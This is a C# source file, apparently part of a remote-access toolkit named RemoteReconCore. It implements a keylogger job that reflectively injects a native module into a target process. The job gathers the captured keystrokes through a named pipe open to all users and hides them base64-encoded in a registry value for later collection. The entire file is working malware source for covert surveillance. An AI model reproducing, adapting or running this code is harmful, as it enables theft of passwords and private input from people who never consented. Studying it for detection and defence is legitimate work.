using System;
using System.Collections.Generic;
using System.IO.Pipes;
using System.IO;
using System.Text;
using System.Threading;
using ReflectiveInjector;
using System.Windows.Forms;
using System.Security.Principal;

namespace RemoteReconCore
{
    public class Keylogger : IJobs
    {
        private int targetPid;
        private static NamedPipeServerStream server;
        private static Thread t;
        public Keylogger(int pid)
        {
            targetPid = pid;
        }

        public KeyValuePair<int, string> Run()
        {
            byte[] keylogMod = Agent.PatchRemoteReconNative("keylog");
            Injector keylog = new Injector(targetPid, keylogMod);
            if (!keylog.Inject())
                return new KeyValuePair<int, string>(2, "Failed to inject keylogger");
            else
            {
#if DEBUG 
                Console.WriteLine("Injected Keylogger");
#endif
                try
                {
                    Agent.t = new Thread(() =>
                    {
                        ReceiveKeyStrokes();
                    });
                    Agent.t.SetApartmentState(ApartmentState.STA);
                    Agent.t.IsBackground = true;
                    Agent.t.Start();
#if DEBUG
                    Console.WriteLine("Started background thread to sync keylogger");
#endif
                    string msg = Convert.ToBase64String(Encoding.ASCII.GetBytes("Keylogger successfully started"));
                    return new KeyValuePair<int, string>(0, msg);
                }
                catch (Exception)
                {
                    string msg = Convert.ToBase64String(Encoding.ASCII.GetBytes("Keylog background thread failed to start"));
                    return new KeyValuePair<int, string>(2, msg);
                }
                
            }
            
        }

        private static void ReceiveKeyStrokes()
        {
            string enc = "";
            
            try
            {
                PipeSecurity ps = new PipeSecurity();
                ps.AddAccessRule(new PipeAccessRule(new SecurityIdentifier(WellKnownSidType.WorldSid, null), PipeAccessRights.ReadWrite, System.Security.AccessControl.AccessControlType.Allow));
                server = new NamedPipeServerStream("svc_kl", PipeDirection.In, 1, PipeTransmissionMode.Byte, PipeOptions.WriteThrough, 128, 128, ps, HandleInheritability.None, PipeAccessRights.ChangePermissions);
#if DEBUG
                Console.WriteLine("Waiting for client to connect");
#endif
                server.WaitForConnection();
            }
            catch (Exception e)
            {
#if DEBUG
                Console.WriteLine(e.ToString());
#endif
                string msg = Convert.ToBase64String(Encoding.ASCII.GetBytes(e.ToString()));
                Agent.rrbase.SetValue(Agent.modkey, msg);
            }
            
            
#if DEBUG
            Console.WriteLine("Received connection from client");
            Console.WriteLine("Starting loop");
#endif
            //StreamReader sr = new StreamReader(server);
            while(server.IsConnected)
            {
                string oldVal = "";
                oldVal = Encoding.ASCII.GetString(Convert.FromBase64String((string)Agent.rrbase.GetValue(Agent.kkey)));
                
                try
                {
                    
                    byte[] pipeBytes = new byte[5];
                    server.Read(pipeBytes, 0, 5);
                    //server.Flush();
                    string ks = Encoding.UTF8.GetString(pipeBytes);

                    ks = ks.TrimEnd(new char[] { '\0'});
#if DEBUG
                    Console.Write(ks);
#endif
                    oldVal = oldVal + ks;
                    enc = Convert.ToBase64String(Encoding.UTF8.GetBytes(oldVal));
                }
                catch (Exception e)
                {
                    enc = Convert.ToBase64String(Encoding.ASCII.GetBytes(e.ToString()));
#if DEBUG
                    Console.WriteLine("Error: \n" + e.ToString());
#endif
                }

                Agent.rrbase.SetValue(Agent.kkey, enc);
                Thread.Sleep(1000);
            }

#if DEBUG
            Console.WriteLine("Client disconnected");
#endif
            //sr.Close();
            server.Flush();
            server.Close();
            server.Dispose();
            
        }

    }
}
